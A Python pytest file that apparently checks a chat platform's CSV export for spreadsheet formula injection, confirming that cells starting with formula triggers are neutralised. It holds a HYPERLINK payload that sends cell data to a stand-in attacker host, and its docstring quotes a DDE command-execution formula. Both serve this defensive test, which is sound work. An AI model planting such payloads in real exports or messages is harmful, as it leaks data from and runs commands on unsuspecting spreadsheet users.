"""A customer's words must not become a formula in the employee's spreadsheet.

The conversation export writes the message body and the customer's display name
into CSV cells verbatim. A customer messages the business over any channel with
`=HYPERLINK(...)` or `=cmd|'/C calc'!A0`; an employee exports the thread and
opens it in Excel or LibreOffice, and the cell runs. The attacker never signs
in — sending a chat message is the whole attack.

The fix prefixes a single quote to any cell that begins with a formula trigger,
so the spreadsheet reads it as text. This drives the real export endpoint.
"""

from __future__ import annotations

import csv
import io
import sys

import pytest

PASSWORD = "OwnerPass123!"
ATTACK = '=HYPERLINK("http://attacker.example/?x="&A1,"refund")'


@pytest.fixture()
def app_client(platform, monkeypatch):
    from database.manager import DatabaseManager
    import database.manager as manager_module
    from backend.api.routes import auth, conversation_tags, conversations

    test_manager = platform["manager"]
    monkeypatch.setattr(manager_module, "database_manager", test_manager)
    for module in list(sys.modules.values()):
        held = getattr(module, "database_manager", None)
        if isinstance(held, DatabaseManager) and held is not test_manager:
            monkeypatch.setattr(module, "database_manager", test_manager)

    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    app = FastAPI()
    for module in (auth, conversations, conversation_tags):
        app.include_router(module.router)
    return TestClient(app, raise_server_exceptions=False)


@pytest.fixture()
def owner(platform, alpha, app_client):
    from backend.services.auth_service import auth_service
    from database.manager import utc_now_iso

    user_id = auth_service.create_user(
        email="rana@alpha.example.com", password=PASSWORD, full_name="Rana Haddad"
    )
    with platform["manager"].control() as conn:
        role = conn.execute(
            "SELECT id FROM roles WHERE company_id = ? AND code = 'owner'",
            (alpha["id"],),
        ).fetchone()
        conn.execute(
            "INSERT INTO company_users (company_id, user_id, role_id, status, created_at)"
            " VALUES (?, ?, ?, 'active', ?)",
            (alpha["id"], user_id, int(role["id"]), utc_now_iso()),
        )
        conn.commit()
    response = app_client.post(
        "/api/auth/login",
        json={
            "workspace_code": alpha["workspace_code"],
            "company": alpha["name"],
            "email": "rana@alpha.example.com",
            "password": PASSWORD,
        },
    )
    assert response.status_code == 200, response.text
    return {"headers": {"Authorization": f"Bearer {response.json()['access_token']}"}}


@pytest.fixture()
def hostile_conversation(platform, alpha):
    from backend.services.conversation_control_service import (
        conversation_control_service,
    )
    from backend.services.message_service import message_service

    conversation_control_service.get_or_create(
        company_id=alpha["id"], channel="messenger", external_user_id="cust-1"
    )
    message_service.save_message(
        company_id=alpha["id"], channel="messenger", external_user_id="cust-1",
        direction="in", text=ATTACK, sender_type="customer",
    )
    return "messenger", "cust-1"


def test_a_formula_in_a_message_is_neutralised_in_the_csv(
    app_client, owner, hostile_conversation
):
    channel, user_id = hostile_conversation

    response = app_client.get(
        f"/conversations/{channel}/{user_id}/export?format=csv",
        headers=owner["headers"],
    )
    assert response.status_code == 200, response.text

    # The attack text must be present (nothing was dropped) but no parsed cell
    # may still begin with a formula trigger.
    assert "HYPERLINK" in response.text, "the message body was lost from the export"

    reader = csv.DictReader(io.StringIO(response.text))
    triggers = ("=", "+", "-", "@", "\t", "\r", "\n")
    for row in reader:
        for value in row.values():
            if isinstance(value, str) and value:
                assert value[0] not in triggers, (
                    f"a cell still starts with a formula trigger: {value!r}"
                )
